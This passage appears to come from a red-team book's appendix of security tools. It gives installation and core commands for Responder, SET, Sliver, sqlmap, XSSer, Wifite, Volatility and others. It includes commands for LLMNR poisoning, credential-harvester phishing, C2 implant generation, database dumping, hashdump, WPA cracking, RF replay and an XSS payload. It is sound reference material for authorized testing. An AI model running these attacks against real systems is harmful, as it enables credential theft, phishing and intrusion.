# Enable specific features
sudo responder -I eth0 -wrf --lm --disable-ess
```

**Use Cases**:
- NTLM hash capture
- Internal network penetration testing
- NetBIOS/LLMNR poisoning
- Credential harvesting

**Alternatives**:
- Inveigh (for Windows)
- Metasploit auxiliary modules
- NetNTLM Downgrade Attack tools

### RFCrack

**Description**: Radio frequency analysis tool for testing the security of RF-based systems.

**Installation**:
```bash
# Clone the repository
git clone https://github.com/cclabsInc/RFCrack.git
cd RFCrack

# Install dependencies
pip install -r requirements.txt
```

**Core Commands**:
```bash
# Launch RFCrack
python RFCrack.py

# Enter interactive mode
set interactive

# Configure frequency for common IoT devices
set freq 433000000

# Start signal capture
set mod ASK_OOK
startrecord

# After capturing, replay signal
stoprecord
replay
```

**Use Cases**:
- RF security assessment
- Replay attacks
- Rolling code analysis
- Remote code/signal tampering

**Alternatives**:
- GNURadio
- HackRF tools
- Yardstick One utilities

### ScoutSuite

**Description**: Multi-cloud security auditing tool for AWS, Azure, Google Cloud, and Oracle Cloud.

**Installation**:
```bash
# Using pip
pip install scoutsuite

# Using Git
git clone https://github.com/nccgroup/ScoutSuite
cd ScoutSuite
pip install -r requirements.txt
python setup.py install
```

**Core Commands**:
```bash
# AWS assessment
scout aws

# Using specific profile
scout aws --profile red-team

# Azure assessment
scout azure

# GCP assessment
scout gcp --service-account /path/to/service-account.json
```

**Use Cases**:
- Cloud security auditing
- Misconfiguration identification
- Multi-cloud security assessment
- Compliance verification

**Alternatives**:
- CloudSploit
- Prowler (AWS-specific)
- Steampipe

### SET (Social Engineering Toolkit)

**Description**: Framework for social engineering attacks with various attack vectors.

**Installation**:
```bash
# Using apt
sudo apt install set

# From source
git clone https://github.com/trustedsec/social-engineer-toolkit.git
cd social-engineer-toolkit
pip install -r requirements.txt
```

**Core Commands**:
```bash
# Launch SET
sudo setoolkit

# Navigate through menus:
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester Attack Method
```

**Use Cases**:
- Phishing campaigns
- Spear-phishing attacks
- Website cloning
- Credential harvesting

**Alternatives**:
- Gophish
- King Phisher
- Lucy (commercial)

### Skipfish

**Description**: Active web application security reconnaissance tool designed for speed and comprehensive testing.

**Installation**:
```bash
# Using apt
sudo apt install skipfish
```

**Core Commands**:
```bash
# Basic scan
skipfish -o output_dir https://example.com

# With authentication
skipfish -o output_dir -A username:password https://example.com

# Configure scan depth and limits
skipfish -o output_dir -d 2 -l 100 https://example.com
```

**Use Cases**:
- Web application security assessment
- High-speed application mapping
- Asset discovery
- Form attack surface analysis

**Alternatives**:
- OWASP ZAP
- Nikto
- Wapiti

### Sliver

**Description**: Cross-platform adversary emulation/red team framework with advanced features.

**Installation**:
```bash
# Install from GitHub releases
curl -s https://sliver.sh/install|sudo bash

# Start the server
sliver-server
```

**Core Commands**:
```bash
# Generate implant
generate --http example.com

# Start HTTP listener
http

# Interact with session
use [session-id]

# Execute shell command
shell whoami
```

**Use Cases**:
- C2 framework
- Red team operations
- Post-exploitation
- Adversary emulation

**Alternatives**:
- Metasploit Framework
- Covenant
- Empire

### SpiderFoot

**Description**: Open source intelligence (OSINT) automation tool for footprinting and reconnaissance.

**Installation**:
```bash
# Using pip
pip install spiderfoot

# From source
git clone https://github.com/smicallef/spiderfoot.git
cd spiderfoot
pip install -r requirements.txt
```

**Core Commands**:
```bash
# Start the SpiderFoot web interface
python3 sf.py -l 127.0.0.1:5001

# CLI mode
python3 sf.py -s "example.com" -m sfp_whois,sfp_dnsresolve -q
```

**Use Cases**:
- OSINT gathering
- Target profiling
- Digital footprint analysis
- Reconnaissance automation

**Alternatives**:
- Maltego
- Recon-ng
- TheHarvester

### SQLmap

**Description**: Automated SQL injection detection and exploitation tool.

**Installation**:
```bash
# Using apt
sudo apt install sqlmap

# From source
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

**Core Commands**:
```bash
# Basic scan
sqlmap -u "https://example.com/page.php?id=1"

# Extract databases
sqlmap -u "https://example.com/page.php?id=1" --dbs

# Target specific database
sqlmap -u "https://example.com/page.php?id=1" -D database_name --tables

# Extract data
sqlmap -u "https://example.com/page.php?id=1" -D database_name -T users --dump
```

**Use Cases**:
- SQL injection detection
- Database enumeration
- Data extraction
- Authentication bypass testing

**Alternatives**:
- NoSQLMap (for NoSQL databases)
- jSQL
- Havij

### THC-Hydra (see Hydra)

### Trivy

**Description**: Comprehensive vulnerability scanner for containers, filesystems, and Git repositories.

**Installation**:
```bash
# Using apt
sudo apt-get install wget apt-transport-https gnupg lsb-release
wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | sudo apt-key add -
echo deb https://aquasecurity.github.io/trivy-repo/deb $(lsb_release -sc) main | sudo tee -a /etc/apt/sources.list.d/trivy.list
sudo apt-get update
sudo apt-get install trivy
```

**Core Commands**:
```bash
# Scan container image
trivy image nginx:1.19

# Scan filesystem
trivy fs ./my-project/

# Scan Kubernetes resources
trivy kubernetes --namespace default
```

**Use Cases**:
- Container vulnerability scanning
- Code security analysis
- Kubernetes security assessment
- License compliance checking

**Alternatives**:
- Grype
- Clair
- Snyk

### Volatility

**Description**: Memory forensics framework for extracting digital artifacts from volatile memory (RAM) samples.

**Installation**:
```bash
# Using pip
pip install volatility3

# For volatility 2 (more plugins)
pip install volatility
```

**Core Commands**:
```bash
# List available plugins
vol -h

# Identify memory profile
vol.py -f memory.dmp imageinfo

# List processes
vol.py -f memory.dmp --profile=Win10x64_19041 pslist

# Extract passwords
vol.py -f memory.dmp --profile=Win10x64_19041 hashdump
```

**Use Cases**:
- Memory forensics analysis
- Malware detection
- Hidden process discovery
- Credential extraction

**Alternatives**:
- Rekall
- Redline
- SANS SIFT Workstation

### Wapiti

**Description**: Web application vulnerability scanner that identifies various security issues.

**Installation**:
```bash
# Using apt
sudo apt install wapiti
```

**Core Commands**:
```bash
# Basic scan
wapiti -u https://example.com/

# Specify scan modules
wapiti -u https://example.com/ -m xss,sql,exec

# Output report
wapiti -u https://example.com/ -o report -f html
```

**Use Cases**:
- Web application security assessment
- Injection vulnerability discovery
- XSS detection
- OWASP Top 10 scanning

**Alternatives**:
- OWASP ZAP
- Skipfish
- Nikto

### WhatWeb

**Description**: Web scanner that identifies technologies, content management systems, and other components of websites.

**Installation**:
```bash
# Using apt
sudo apt install whatweb

# From source
git clone https://github.com/urbanadventurer/WhatWeb.git
cd WhatWeb
```

**Core Commands**:
```bash
# Basic scan
whatweb example.com

# Aggressive scan
whatweb -a 3 example.com

# Output to file
whatweb example.com -o report.txt
```

**Use Cases**:
- Web technology fingerprinting
- CMS identification
- Web stack enumeration
- Reconnaissance

**Alternatives**:
- Wappalyzer
- BuiltWith (online service)
- WebTech

### Wifite

**Description**: Automated wireless attack tool designed to simplify auditing WiFi networks.

**Installation**:
```bash
# Using apt
sudo apt install wifite
```

**Core Commands**:
```bash
# Basic scan and attack
sudo wifite

# Attack only WPA networks
sudo wifite --wpa

# Specify interface
sudo wifite -i wlan0
```

**Use Cases**:
- Wireless network security assessment
- WPA/WPA2/WEP cracking
- WiFi password testing
- Evil twin attacks

**Alternatives**:
- Aircrack-ng
- Kismet
- Fern WiFi Cracker

### Wireshark/Tshark

**Description**: Network protocol analyzer for capturing and inspecting network traffic.

**Installation**:
```bash
# Using apt
sudo apt install wireshark tshark

# Allow non-root capture
sudo dpkg-reconfigure wireshark-common
sudo usermod -a -G wireshark $USER
```

**Core Commands**:
```bash
# Start Wireshark GUI
wireshark

# Capture with specific interface
sudo tshark -i eth0

# Capture with filter
sudo tshark -i eth0 -f "port 80"

# Read from file
tshark -r capture.pcap -Y "http"
```

**Use Cases**:
- Network traffic analysis
- Protocol inspection
- Traffic capture
- Packet forensics

**Alternatives**:
- tcpdump
- NetworkMiner
- Microsoft Network Monitor

### XSSer

**Description**: Automated framework for detecting and exploiting XSS vulnerabilities in web applications.

**Installation**:
```bash
# Using apt
sudo apt install xsser

# From source
git clone https://github.com/epsylon/xsser.git
cd xsser
```

**Core Commands**:
```bash
# Basic scan
xsser --url "https://example.com/search?q=test"

# Multiple injection points
xsser --url "https://example.com/page.php" --data "param1=XSS&param2=XSS"

# Using specific payload
xsser --url "https://example.com/page.php" --payload "<script>alert(1)</script>"
```

**Use Cases**:
- Cross-site scripting detection
- XSS payload generation
- Web application security testing
- Client-side attack simulation

**Alternatives**:
- XSStrike
- XSS Hunter
- OWASP ZAP XSS scanner

## Conclusion

This comprehensive tool reference covers the core functionality and usage of all the security tools discussed throughout this book. Remember that the most effective red team operations typically involve a combination of these tools, used strategically at different phases of the assessment. As new versions and tools are released, always check the official documentation for the most current syntax and capabilities.

As a red team operator, continuous learning and experimentation with these tools is essential. Take time to explore additional features beyond the basic commands provided here, and practice in controlled environments before applying these tools in production assessments.

In the next appendix, we'll provide a collection of custom scripts that leverage these tools to automate common red team tasks and workflows.
